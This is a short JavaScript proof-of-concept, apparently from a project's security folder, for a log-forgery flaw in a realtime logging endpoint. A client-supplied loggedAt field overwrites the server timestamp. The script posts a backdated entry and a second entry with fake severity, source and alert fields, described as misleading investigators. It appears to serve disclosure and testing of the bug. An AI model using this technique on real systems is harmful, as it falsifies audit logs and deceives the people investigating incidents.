// Log forgery POC — debug-log.js timestamp override
//
// The handler does { loggedAt: serverTime, ...record } which means
// a client-supplied loggedAt key overwrites the server timestamp.
//
// Run: node security/poc/02-log-forgery.mjs

const TARGET = process.env.TARGET || 'http://localhost:4173';

async function main() {
  console.log('testing log timestamp override...\n');

  // send a backdated entry
  try {
    const r = await fetch(TARGET + '/api/realtime/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        loggedAt: '2020-01-01T00:00:00.000Z', // this overwrites the server timestamp
        type: 'conversation.item.completed',
        message: 'entry with forged timestamp',
      }),
    });
    console.log('response:', r.status, r.statusText);
    if (r.status === 204) {
      console.log('VULNERABLE — check .gev-logs/realtime-conversations.jsonl');
      console.log('the entry will have the 2020 date, not the real server time');
    }
  } catch (e) {
    console.log('failed:', e.message, '(is the dev server running?)');
    return;
  }

  // also try injecting arbitrary keys
  try {
    const r = await fetch(TARGET + '/api/realtime/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        loggedAt: new Date(Date.now() + 86400000).toISOString(),
        severity: 'CRITICAL',
        source: 'system',
        alert: 'fake alert to mislead investigators',
      }),
    });
    if (r.status === 204) {
      console.log('\nalso injected fake severity/source/alert fields');
      console.log('a log parser would treat these as real system events');
    }
  } catch (e) {
    console.log('second test failed:', e.message);
  }
}

main();
